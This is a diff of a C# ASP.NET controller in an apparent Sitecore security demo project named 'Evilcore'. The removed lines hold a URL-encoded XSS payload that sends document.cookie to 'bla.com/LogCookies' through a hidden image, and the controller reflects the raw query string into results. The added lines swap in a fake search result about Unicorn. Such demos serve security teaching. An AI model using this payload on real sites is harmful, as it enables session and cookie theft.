@@ -1,4 +1,7 @@
 ﻿
+using Shared.Models;
+using Sitecore.ContentSearch;
+using Sitecore.ContentSearch.SearchTypes;
 using SitecoreSecurity.Web.Models;
 using System;
 using System.Collections.Generic;
@@ -12,14 +15,21 @@ namespace Evilcore.Web.Controllers
   {    
     public ActionResult Index(string q)
     {
-      var b = Request.QueryString["q"];
-      string s = @"%27)%3Bvar%20img%3Ddocument.createElement(%22img%22)%3Bimg.src%3D%22http%3A%2F%2Fbla.com%2FLogCookies%3Fcookies%3D%22%2BencodeURIComponent(document.cookie)%3BimgsetAttribute%22style%22%2C%20%22display%3A%20none%22)%3Bdocument.body.appendChild(img)%3B%24(%27h2%27).text(%27No%20results%20found%27)%3B%2F%2F";
-      var a = HttpUtility.HtmlDecode(s);
-      var list = new List<SearchResultsModel>();
+        var term = Request.QueryString["q"];      
 
-      var m1 = new SearchResultsModel { SearchTitle = b, Description = "bla" };
-      list.Add(m1);
-      return View(list);
+        SearchModel model = new SearchModel();
+        model.SearchTerm = term;
+
+        // fake search results list        
+        var list = new List<SearchResultsModel>();       
+        var m1 = new SearchResultsModel { SearchTitle = "Serialize all the things with Unicorn", Description = @"Sitecore development artifacts are both code and database items, such as rendering code and rendering items. As developers, we use serialization to write our database artifacts into source control along with our code so that we have a record of all our development artifacts. Unicorn is a tool to make serializing items and sharing them across teams and environments easy and fun. <br />
+            In this session we’ll go over what Unicorn is,
+            why you would want it,
+            demonstrate how to use Unicorn,
+            and show some of the new features in the latest release." };
+        list.Add(m1);
+        model.SearchResults = list;
+        return View(model);
     }
   }
 }
